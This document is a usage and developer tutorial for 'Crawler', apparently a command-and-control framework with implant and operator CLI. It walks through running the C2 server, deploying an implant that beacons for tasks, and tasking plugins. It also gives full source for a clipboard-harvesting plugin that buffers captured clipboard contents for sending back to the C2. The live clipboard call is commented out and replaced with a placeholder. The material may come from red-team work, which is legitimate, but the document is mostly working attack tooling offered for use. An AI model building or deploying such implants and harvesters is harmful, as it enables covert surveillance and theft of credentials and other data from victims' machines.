# Crawler - Usage and Development Tutorial

This tutorial provides a guide for setting up and using the Phase 1 version of Crawler, as well as instructions for developers who wish to extend its capabilities.

---

## Part 1: Usage Guide

This section will walk you through setting up the environment and running the C2 server and implant.

### Step 1: Environment Setup

First, you need to install the required Python dependencies. It's recommended to do this in a virtual environment.

1.  **Navigate to the project root directory** (the one containing this `TUTORIAL.md` file).
2.  **Install dependencies** using pip:
    ```bash
    pip install -r crawler/requirements.txt
    ```

### Step 2: Run the C2 Server

The Command & Control (C2) server is the brain of the operation.

1.  **Open a new terminal.**
2.  **Navigate to the project root directory.**
3.  **Start the C2 server** using `uvicorn`:
    ```bash
    uvicorn crawler.c2.main:app --host 0.0.0.0 --port 8000
    ```
4.  You should see output indicating that the server is running. You can also open `http://127.0.0.1:8000/docs` in a web browser to see the auto-generated API documentation.

### Step 3: Run the Implant

The implant is the agent that runs on the "target" machine. For this test, we will run it on the same machine.

1.  **Open a second terminal.** This is important, as the C2 server is occupying the first one.
2.  **Navigate to the project root directory.**
3.  **Run the implant script** as a Python module. This is crucial for the imports to work correctly.
    ```bash
    python3 -m crawler.implant.agent
    ```
4.  The implant will start, register with the C2, and begin beaconing for tasks in the background.

### Step 4: Use the CLI to Interact

The command-line interface (CLI) is how you, the operator, control the system.

1.  **Open a third terminal.**
2.  **Navigate to the project root directory.**
3.  **List active implants:**
    ```bash
    python3 crawler/c2/cli.py implants
    ```
    You should see the implant you just started, along with its unique ID and default ROE Tier (3).

4.  **Task the implant:** Let's tell the implant to start the `dummy` plugin. You will need the `implant_id` from the previous command.
    ```bash
    # Replace <implant_id> with the actual ID
    python3 crawler/c2/cli.py task <implant_id> start_plugin --args '{"plugin_name": "dummy"}'
    ```

5.  **Check the C2 log:** After a few seconds, you will see data from the dummy plugin appearing in the terminal where the C2 server is running. This confirms the end-to-end communication is working.

---

## Part 2: Developer Guide

This section explains how to extend Crawler by creating your own plugins.

### Understanding the Plugin Architecture

The implant is designed to be modular. All specific data collection capabilities are implemented as "plugins". The core `agent.py` script automatically discovers and loads any valid plugin placed in the `crawler/implant/plugins/` directory.

A valid plugin must:
1.  Be a Python file in the `crawler/implant/plugins/` directory.
2.  Contain a class that inherits from `BasePlugin`.
3.  Implement all the abstract methods defined in `BasePlugin`.

### Creating a New Plugin

Here is a template for a new plugin. You can use this as a starting point. Let's imagine we are creating a plugin to collect the content of the clipboard.

1.  **Create a new file**: `crawler/implant/plugins/clipboard_harvester.py`
2.  **Add the following code** to the new file:

```python
# crawler/implant/plugins/clipboard_harvester.py

import threading
import time
import datetime
from typing import List, Dict, Any

# You must import the base class
from .base_plugin import BasePlugin

# A library for accessing the clipboard (you would add this to requirements.txt)
# import pyperclip

class ClipboardHarvesterPlugin(BasePlugin):
    """
    A plugin to periodically harvest clipboard content.
    """

    def __init__(self):
        # It's good practice to have a flag to control your main loop.
        self.is_running = False
        # A thread-safe lock is essential for accessing shared data.
        self._lock = threading.Lock()
        # A buffer to store collected data between C2 beacons.
        self._data_buffer: List[Dict[str, Any]] = []
        self._thread: threading.Thread | None = None
        self._last_clipboard_content = ""

    def get_name(self) -> str:
        """Return the unique name for the C2 to use."""
        return "clipboard_harvester"

    def _collect_clipboard(self):
        """The main loop for the plugin's background thread."""
        while self.is_running:
            try:
                # This is a placeholder for a real clipboard library
                # current_clipboard = pyperclip.paste()
                current_clipboard = f"Clipboard content as of {datetime.datetime.now()}" # Placeholder

                if current_clipboard and current_clipboard != self._last_clipboard_content:
                    self._last_clipboard_content = current_clipboard

                    with self._lock:
                        data_entry = {
                            "timestamp_utc": datetime.datetime.utcnow().isoformat(),
                            "log_type": "clipboard_capture",
                            "content": current_clipboard
                        }
                        self._data_buffer.append(data_entry)

            except Exception as e:
                print(f"Error in clipboard harvester: {e}")

            # Don't run in a tight loop; sleep for a reasonable interval.
            time.sleep(5)

    def start(self, args: Dict[str, Any]):
        """Called by the agent to start the plugin."""
        if self.is_running:
            return

        self.is_running = True
        # Start the collection logic in a daemon thread so it doesn't block.
        self._thread = threading.Thread(target=self._collect_clipboard)
        self._thread.daemon = True
        self._thread.start()
        print("Clipboard Harvester plugin started.")

    def stop(self):
        """Called by the agent to stop the plugin."""
        self.is_running = False
        if self._thread and self._thread.is_alive():
            # Wait for the thread to finish cleanly.
            self._thread.join(timeout=2)
        print("Clipboard Harvester plugin stopped.")

    def get_data(self) -> List[Dict[str, Any]]:
        """Called by the agent to get collected data."""
        with self._lock:
            # Return a copy of the buffer and then clear it.
            data_to_send = list(self._data_buffer)
            self._data_buffer.clear()
            return data_to_send
```

3.  **That's it!** The next time you run the `agent.py` script, it will automatically load this new plugin. You can then task it from the CLI using its name:
    ```bash
    python3 crawler/c2/cli.py task <implant_id> start_plugin --args '{"plugin_name": "clipboard_harvester"}'
    ```
